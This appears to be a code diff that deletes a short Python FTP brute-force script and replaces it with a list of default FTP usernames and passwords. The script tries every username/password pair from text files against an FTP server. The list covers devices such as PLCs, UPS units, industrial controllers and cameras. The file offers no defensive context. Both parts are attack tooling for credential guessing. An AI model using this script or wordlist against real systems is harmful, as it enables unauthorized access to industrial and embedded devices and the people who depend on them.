@@ -1,33 +1,138 @@
-from ftplib import FTP
+anonymous
+root
+root
+ftp
+admin
+localadmin
+admin
+apc
+admin
+Root
+Admin
+User
+Guest
+ftp
+admin
+a
+admin
+adtec
+admin
+none
+instrument
+user
+root
+default
+admin
+nmt
+admin
+supervisor
+user1
+avery
+IEIeMerge
+ADMIN
+beijer
+Admin
+admin
+admin
+root
+se
+admin
+device
+apc
+dm
+dmftp
+httpadmin
+user
+MELSEC
+QNUDECPU
+ftp_boot
+uploader
+ftpuser
+USER
+qbf77101
+ntpupdate
+sysdiag
+wsupgrade
+pcfactory
+loader
+test
+webserver
+fdrusers
+nic2212
+user
+su
+MayGion
+admin
+PlcmSpIp
 
-# FTP server information
-ftp_server = "ftp.example.com"
-ftp_port = 21
 
-# Function to attempt login with given credentials
-def try_ftp_login(username, password):
-    try:
-        ftp = FTP()
-        ftp.connect(ftp_server, ftp_port)
-        ftp.login(username, password)
-        ftp.quit()
-        return True
-    except Exception as e:
-        return False
 
-# Read usernames from username.txt
-with open("username.txt", "r") as user_file:
-    usernames = [line.strip() for line in user_file.readlines()]
 
-# Read passwords from password.txt
-with open("password.txt", "r") as pass_file:
-    passwords = [line.strip() for line in pass_file.readlines()]
 
-# Iterate through usernames and passwords
-for password in passwords:
-    for username in usernames:
-        if try_ftp_login(username, password):
-            print(f"Login successful for {username}:{password}")
-            break
-        else:
-            print(f"Login failed for {username}:{password}")
+
+anonymous
+rootpasswd
+12hrs37
+b1uRR3
+admin
+localadmin
+1234
+apc
+nas
+wago
+wago
+user
+guest
+ftp
+password
+avery
+123456
+none
+admin12345
+dpstelecom
+instrument
+password
+password
+default
+default
+1234
+Janitza
+supervisor
+pass1
+avery
+eMerge
+12345
+beijer
+admin
+1234
+1111
+admin
+1234
+stingray
+apc
+apc
+ftp
+ftp
+fhttpadmin
+system
+MELSEC
+QNUDECPU
+ftp_boot
+ZYPCOM
+password
+USER
+hexakisoctahedron
+ntpupdate
+factorycast@schneider
+wsupgrade
+pcfactory
+fwdownload
+testingpw
+webpages
+sresurdf
+poiuypoiuy
+user00
+ko2003wa
+maygion.com
+9999
+PlcmSpIp
